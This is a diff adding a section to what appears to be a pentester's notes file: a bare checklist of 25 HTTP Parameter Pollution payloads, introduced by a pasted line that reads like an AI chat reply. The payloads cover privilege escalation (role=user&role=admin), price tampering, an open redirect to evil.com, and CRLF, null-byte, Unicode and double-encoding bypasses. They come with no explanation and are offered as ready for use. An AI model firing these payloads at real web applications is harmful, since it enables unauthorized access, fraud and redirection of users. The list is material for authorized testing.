@@ -1676,6 +1676,166 @@ Example of headless browsers commands:
     ```ps1
     "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu --window-size=1280,720 --screenshot="C:\tmp\screen.png" "https://google.com"
     ```
+Below is a **clean pentester-friendly list** for **HTTP Parameter Pollution (HPP)** containing **ONLY testcase names with example payloads**, including **bypass techniques**.
+(No explanations, no extra text — ready for checklist / GitHub use.)
+
+---
+## HTTP Parameter Pollution – Test Cases & Payloads
+
+### 1. Duplicate Parameter Override
+
+```
+?id=1&id=2
+```
+
+### 2. Last Parameter Wins
+
+```
+?role=user&role=admin
+```
+
+### 3. First Parameter Wins
+
+```
+?admin=true&admin=false
+```
+
+### 4. Mixed Method Pollution (GET + POST)
+
+```
+GET /login?user=admin
+POST user=guest
+```
+
+### 5. Parameter Pollution via POST Body
+
+```
+username=test&username=admin
+```
+
+### 6. URL-Encoded Parameter Pollution
+
+```
+id=1%26id=2
+```
+
+### 7. Double URL Encoding Bypass
+
+```
+id=1%2526id%253D2
+```
+
+### 8. Array-Style Parameter Injection
+
+```
+id[]=1&id[]=2
+```
+
+### 9. Indexed Array Pollution
+
+```
+id[0]=1&id[1]=2
+```
+
+### 10. JSON + URL Parameter Pollution
+
+```
+GET /api?role=admin
+{"role":"user"}
+```
+
+### 11. HPP via Fragment Injection
+
+```
+?id=1#id=2
+```
+
+### 12. Header-Based Parameter Pollution
+
+```
+X-Forwarded-User: admin&user=guest
+```
+
+### 13. Cookie Parameter Pollution
+
+```
+Cookie: role=user; role=admin
+```
+
+### 14. Case Sensitivity Bypass
+
+```
+?role=admin&Role=user
+```
+
+### 15. Unicode Normalization Bypass
+
+```
+?rоle=admin&role=user
+```
+
+*(Unicode "o")*
+
+### 16. Null Byte Injection
+
+```
+role=admin%00role=user
+```
+
+### 17. Separator Confusion (`;`)
+
+```
+id=1;id=2
+```
+
+### 18. Separator Confusion (`|`)
+
+```
+id=1|id=2
+```
+
+### 19. CRLF Injection
+
+```
+id=1%0d%0aid=2
+```
+
+### 20. Parameter Pollution with Empty Value
+
+```
+admin=true&admin=
+```
+
+### 21. HPP for Access Control Bypass
+
+```
+user=guest&isAdmin=true
+```
+
+### 22. HPP for Price Manipulation
+
+```
+price=100&price=1
+```
+
+### 23. HPP for Redirect Bypass
+
+```
+redirect=/home&redirect=https://evil.com
+```
+
+### 24. Path Parameter Pollution
+
+```
+/user/123;role=admin
+```
+
+### 25. Parameter Pollution with Wildcards
+
+```
+role=*&role=admin
+```
+
 ---
 # HTTP Hidden Parameters
 
